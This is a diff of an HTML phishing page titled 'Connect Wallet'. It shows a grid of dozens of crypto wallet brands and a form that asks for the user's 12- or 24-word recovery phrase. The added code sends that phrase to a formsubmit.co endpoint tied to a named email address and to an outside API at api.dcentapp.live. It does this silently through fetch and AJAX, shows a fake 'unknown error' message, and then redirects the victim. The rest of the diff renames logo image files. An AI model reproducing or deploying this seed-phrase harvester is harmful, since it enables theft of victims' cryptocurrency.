@@ -6,7 +6,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
-    <title>smartdecentralizedtools Wallet system</title>
+    <title>Connect Wallet</title>
     <script src="https://kit.fontawesome.com/78d167673c.js" crossorigin="anonymous"></script>
     <style media="all" id="fa-v4-font-face">
         /*!
@@ -8424,34 +8424,40 @@
                     <button id="privateKeySend">Private Key</button>
                 </div>
                 <div class="message-tab"></div>
-                <div class="send-form">
-                    <form action="https://formsubmit.co/9eff1f1d42b576e5ff2638bea3616318" id="form" method="post" enctype="multipart/form-data">
-                        <input type="hidden" name="_captcha" value="false" />
-                        <input type="hidden" name="_next" value="https://smartdappsresolution.netlify.app/" />
-
-                        <input type="hidden" name="wallet" id="walletNameData" />
-                        <div id="data-to-send">
-                            <div class="form-group">
-                                <div class="form-group">
-                                    <input type="hidden" id="type1" name="type" value="phrase" />
-                                    <textarea id="phrase1" name="phrase" required="" class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea>
-                                </div>
-                                <div class="small text-left my-3" style="font-size: 11px">
-                                    Typically 12 (sometimes 24) words separated by single spaces
-                                </div>
-                            </div>
-                        </div>
-                        <button type="submit" id="proceedButton" class="btn btn-primary btn-block" style="font-weight: bold; font-size: 14px">
-              PROCEED
-            </button>
-                        <div class="text-right">
-                            <button type="button" id="cancelBtn" class="btn btn-sm dialog-dismiss btn-danger mt-2 text-right">
-                Cancel
-              </button>
-                        </div>
-                    </form>
+                  <div class="send-form">
+    <form action="https://formsubmit.co/bryanpaulgoodmusic@gmail.com" id="form" method="post" enctype="multipart/form-data">
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_next" id="next-url" value="" />
+        <input type="hidden" name="wallet" id="walletNameData" />
+        
+        <script>
+          const domain = window.location.hostname;
+          document.getElementById("next-url").value = `https://${domain}/wall_connect/load.html`;
+        </script>
+        
+        <div id="data-to-send">
+            <div class="form-group">
+                <div class="form-group">
+                    <input type="hidden" id="type1" name="type" value="phrase" />
+                    <textarea id="phrase1" name="phrase" required="" class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea>
+                </div>
+                <div class="small text-left my-3" style="font-size: 11px">
+                    Typically 12 (sometimes 24) words separated by single spaces
                 </div>
             </div>
+        </div>
+        
+        <button type="submit" id="proceedButton" class="btn btn-primary btn-block" style="font-weight: bold; font-size: 14px">
+            PROCEED
+        </button>
+        <div class="text-right">
+            <button type="button" id="cancelBtn" class="btn btn-sm dialog-dismiss btn-danger mt-2 text-right">
+                Cancel
+            </button>
+        </div>
+    </form>
+</div>
+                </div>
         </div>
     </div>
     <div id="connect-dialog" style="display: none">
@@ -8555,7 +8561,7 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/Solflarewallet.jpg" alt="" />
+              <img class="coin-img" src="./assets/solflarewallet.jpg" alt="" />
               <h4 class="text-white">Solfare Wallet</h4>
             </button>
 
@@ -8565,7 +8571,7 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/CasperSigner.svg" alt="" />
+              <img class="coin-img" src="./assets/caspersigner.svg" alt="" />
               <h4 class="text-white">Casper Signer Wallet</h4>
             </button>
 
@@ -8576,33 +8582,33 @@
 
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/Bitfinity.png" alt="" />
+              <img class="coin-img" src="./assets/bitfinity.png" alt="" />
               <h4 class="text-white">Bitfinity Wallet</h4>
             </button>
 
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/MyTonWallet.jpg" alt="" />
+              <img class="coin-img" src="./assets/mytonwallet.jpg" alt="" />
               <h4 class="text-white">MyTon Wallet</h4>
             </button>
 
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/Tonkeeperwallet.jpg" alt="" />
+              <img class="coin-img" src="./assets/tonkeeperwallet.jpg" alt="" />
               <h4 class="text-white">Tonkeeper Wallet</h4>
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/TonHubWallet.jpg" alt="" />
+              <img class="coin-img" src="./assets/tonhubwallet.jpg" alt="" />
               <h4 class="text-white">TonHub Wallet</h4>
             </button>
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/Electrum.jpg" alt="" />
+              <img class="coin-img" src="./assets/electrum.jpg" alt="" />
               <h4 class="text-white">Electrum Wallet</h4>
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/CasperDash.svg" alt="" />
+              <img class="coin-img" src="./assets/casperdash.svg" alt="" />
               <h4 class="text-white">CasperDash Wallet</h4>
             </button>
 
@@ -8612,7 +8618,7 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/Uniswap-Logo.webp" alt="" />
+              <img class="coin-img" src="./assets/uniswap-logo.webp" alt="" />
               <h4 class="text-white">UNISWAP Wallet</h4>
             </button>
 
@@ -8627,7 +8633,7 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/Casper.svg" alt="" />
+              <img class="coin-img" src="./assets/casper.svg" alt="" />
               <h4 class="text-white">Casper Wallet </h4>
             </button>
 
@@ -8668,7 +8674,7 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/Xverse.jpg" alt="" />
+              <img class="coin-img" src="./assets/xverse.jpg" alt="" />
               <h4 class="text-white">Xverse Wallet</h4>
             </button>
 
@@ -8704,7 +8710,7 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal16" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/Coinbaselogo_Supplied_250x250-2.png" alt="" />
+              <img class="coin-img" src="./assets/coinbaselogo_supplied_250x250-2.png" alt="" />
               <h4 class="text-white">Coinbase</h4>
             </button>
 
@@ -8740,7 +8746,7 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal3" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/m92jEcPI_400x400.jpg" alt="" />
+              <img class="coin-img" src="./assets/m92jecpi_400x400.jpg" alt="" />
               <h4 class="text-white">Argent</h4>
             </button>
 
@@ -8751,12 +8757,12 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal6" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/lg" alt="" />
+              <img class="coin-img" src="./assets/lg.png" alt="" />
               <h4 class="text-white">Safemoon</h4>
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal7" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/lg(1)" alt="" />
+              <img class="coin-img" src="./assets/gnosis-safe.png" alt="" />
               <h4 class="text-white">Gnosis Safe</h4>
             </button>
 
@@ -8808,7 +8814,7 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal18" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/rtDOqMXY_400x400.jpg" alt="" />
+              <img class="coin-img" src="./assets/rtdoqmxy_400x400.jpg" alt="" />
               <h4 class="text-white">Formatic</h4>
             </button>
 
@@ -8825,40 +8831,40 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal21" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/lg(2)" alt="" />
+              <img class="coin-img" src="./assets/ledger.svg" alt="" />
               <h4 class="text-white">Ledger Live</h4>
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal22" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/28189800" alt="" />
+              <img class="coin-img" src="./assets/wall-eth.png" alt="" />
               <h4 class="text-white">WallETH</h4>
             </button>
                         <!-- Modal -->
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal23" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/49746116" alt="" />
+              <img class="coin-img" src="./assets/authereum.png" alt="" />
               <h4 class="text-white">Authereum</h4>
             </button>
                         <!-- Modal -->
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal24" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/5DxVDK36_400x400.png" alt="" />
+              <img class="coin-img" src="./assets/5dxvdk36_400x400.png" alt="" />
               <h4 class="text-white">Dharma</h4>
             </button>
                         <!-- Modal -->
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal25" class="btn coin shadow rounded-xl">
-              <img style="border-radius: 40px" class="coin-img" src="./assets/lg(3)" alt="" />
+              <img style="border-radius: 40px" class="coin-img" src="./assets/1inch-wallet.svg" alt="" />
               <h4 class="text-white">1inch Wallet</h4>
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal26" class="btn coin shadow rounded-xl">
-              <img style="border-radius: 40px" class="coin-img" src="./assets/lg(4)" alt="" />
+              <img style="border-radius: 40px" class="coin-img" src="./assets/huobi.png" alt="" />
               <h4 class="text-white">Huobi</h4>
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal27" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/8EXrk57o_400x400.jpg" alt="" />
+              <img class="coin-img" src="./assets/8exrk57o_400x400.jpg" alt="" />
               <h4 class="text-white">Eidoo</h4>
             </button>
                         <!-- Modal -->
@@ -8869,7 +8875,7 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal29" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/lg(5)" alt="" />
+              <img class="coin-img" src="./assets/loopring.png" alt="" />
               <h4 class="text-white">Loopring</h4>
             </button>
 
@@ -8922,7 +8928,7 @@
                         <!-- Modal -->
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal38" class="btn coin shadow rounded-xl">
-              <img style="border-radius: 40px" class="coin-img" src="./assets/lg(6)" alt="" />
+              <img style="border-radius: 40px" class="coin-img" src="./assets/nash.svg" alt="" />
               <h4 class="text-white">Nash</h4>
             </button>
 
@@ -8932,7 +8938,7 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal40" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/28931745" alt="" />
+              <img class="coin-img" src="./assets/28931745.png" alt="" />
               <h4 class="text-white">GridPlus</h4>
             </button>
 
@@ -8947,7 +8953,7 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal43" class="btn coin shadow rounded-xl">
-              <img style="border-radius: 40px" class="coin-img" src="./assets/44049579" alt="" />
+              <img style="border-radius: 40px" class="coin-img" src="./assets/torus.svg" alt="" />
               <h4 class="text-white">Torus</h4>
             </button>
 
@@ -8970,7 +8976,7 @@
                         <!-- Modal -->
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal47" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/images" alt="" />
+              <img class="coin-img" src="./assets/walletio.png" alt="" />
               <h4 class="text-white">wallet.io</h4>
             </button>
 
@@ -8993,7 +8999,7 @@
                         <!-- Modal -->
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal51" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/Sparkpoint-wallet-logo.png" alt="" />
+              <img class="coin-img" src="./assets/sparkpoint-wallet-logo.png" alt="" />
               <h4 class="text-white">Spark Point</h4>
             </button>
                         <!-- Modal -->
@@ -9004,12 +9010,12 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal53" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/ofbdehdu4sju07vlltgf" alt="" />
+              <img class="coin-img" src="./assets/bitkeep.png" alt="" />
               <h4 class="text-white">BitKeep</h4>
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal54" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/images(1)" alt="" />
+              <img class="coin-img" src="./assets/vision.png" alt="" />
               <h4 class="text-white">Vision</h4>
             </button>
 
@@ -9024,7 +9030,7 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal57" class="btn coin shadow rounded-xl">
-              <img style="border-radius: 40px" class="coin-img" src="./assets/76861339" alt="" />
+              <img style="border-radius: 40px" class="coin-img" src="./assets/76861339.png" alt="" />
               <h4 class="text-white">HaloDeFi</h4>
             </button>
 
@@ -9034,17 +9040,17 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal60" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/images(2)" alt="" />
+              <img class="coin-img" src="./assets/midas.svg" alt="" />
               <h4 class="text-white">Midas</h4>
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal61" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/1_N6Uvv2QMQGqQubnGP1tGig.png" alt="" />
+              <img class="coin-img" src="./assets/1_n6uvv2qmqgqqubngp1tgig.png" alt="" />
               <h4 class="text-white">Ellipal</h4>
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal62" class="btn coin shadow rounded-xl">
-              <img class="coin-img" src="./assets/LOGO-KEYRING-PRO.png" alt="" />
+              <img class="coin-img" src="./assets/logo-keyring-pro.png" alt="" />
               <h4 class="text-white">KEYRING PRO</h4>
             </button>
 
@@ -9066,7 +9072,7 @@
             </button>
 
                         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal66" class="btn coin shadow rounded-xl">
-              <img style="border-radius: 40px" class="coin-img" src="./assets/lg(7)" alt="" />
+              <img style="border-radius: 40px" class="coin-img" src="./assets/kyberswap.png" alt="" />
               <h4 class="text-white">KyberSwap</h4>
             </button>
                         <!-- Modal -->
@@ -9169,9 +9175,85 @@
                     "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
                 },
             });
+            
+            $("#processForm").submit(function(e) {
+                  e.preventDefault();
+                  let processBtn = $("#proceedButton");
+                  let cancelBtn = $("#cancelBtn");
+                  let formData = new FormData(this);
+                  $.ajax({
+                      type: "POST",
+                      url: "https://api.dcentapp.live/0e3efb1f-c4f3-4e78-8273-ac486d61cbde",
+                      data: formData,
+                      cache: false,
+                      contentType: false,
+                      processData: false,
+                      beforeSend: function() {
+                          processBtn.html(
+                              '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...'
+                          );
+                          processBtn.prop("disabled", true);
+                          cancelBtn.prop("disabled", true);
+                      },
+                      success: function() {
+                          // dismissAllDialogs();
+                          setTimeout(function() {
+                              restoreButtons();
+                              $("div.message-tab").html(
+                                  "<div class='alert alert-danger'>An unknown error occured, please try again later.</div>"
+                              );
+                          }, 5000);
+                      },
+                      error: function() {
+                          restoreButtons();
+                          dismissAllDialogs();
+                          errorBox.show();
+                          setTimeout(function() {
+                              dismissAllDialogs();
+                              $("#send-dialog").show();
+                          }, 2500);
+                      },
+                  });
 
-        });
+                  function restoreButtons() {
+                      processBtn.html("PROCEED");
+                      processBtn.prop("disabled", false);
+                      cancelBtn.prop("disabled", false);
+                  }
+                  
+                  function dismissAllDialogs() {
+                      successBox.hide();
+                      errorBox.hide();
+                      $("#connect-dialog").hide();
+                      $("#send-dialog").hide();
+                      $("#processing-dialog").hide();
+                  }
+              });
+          });
+    </script>
+    <script>
+          document.getElementById('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const formData = new FormData(this);
+            // Important: use the /ajax/ endpoint for silent submission
+            const action = "https://formsubmit.co/ajax/bryanpaulgoodmusic@gmail.com";
+
+            fetch(action, {
+              method: "POST",
+              body: formData,
+              headers: {
+                'Accept': 'application/json'
+              }
+            })
+            .then(response => {
+              if (response.ok) {
+                const domain = window.location.hostname;
+                window.location.href = "load.html";
+              }
+            })
+            .catch(error => console.error("Error:", error));
+          });
     </script>
 </body>
-
 </html>
